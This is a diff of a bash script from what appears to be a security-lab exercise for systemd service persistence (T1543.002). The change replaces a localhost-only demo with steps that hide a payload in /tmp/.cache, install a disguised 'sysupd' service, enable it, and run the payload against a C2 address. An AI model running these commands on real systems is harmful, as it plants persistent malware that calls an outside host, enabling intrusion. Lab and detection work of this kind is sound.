@@ -1,15 +1,9 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：投放 + systemd 单元写入/enable + 服务式执行回连。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1543.002：unit 写入 + enable + 服务式执行回连
-"$HERE/common/build.sh" payload.elf
-printf '[Unit]
-Description=service helper
-[Service]
-ExecStart=%s/payload.elf 127.0.0.1 8443
-[Install]
-WantedBy=multi-user.target
-' "$PWD" > /etc/systemd/system/secval-demo.service
-ln -sf /etc/systemd/system/secval-demo.service /etc/systemd/system/multi-user.target.wants/secval-demo.service
-"$HERE/common/with_listener.sh" 8443 ./payload.elf 127.0.0.1 8443
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+cp payload.elf /tmp/.cache/sysupd/payload.elf && chmod 0755 /tmp/.cache/sysupd/payload.elf
+printf '[Unit]\nDescription=service helper\n[Service]\nType=oneshot\nExecStart=/tmp/.cache/sysupd/payload.elf %s 8443\n[Install]\nWantedBy=multi-user.target\n' "$C2_IP" > /etc/systemd/system/sysupd.service
+systemctl daemon-reload
+systemctl enable sysupd.service >/dev/null 2>&1 || true
+/tmp/.cache/sysupd/payload.elf "$C2_IP" 8443
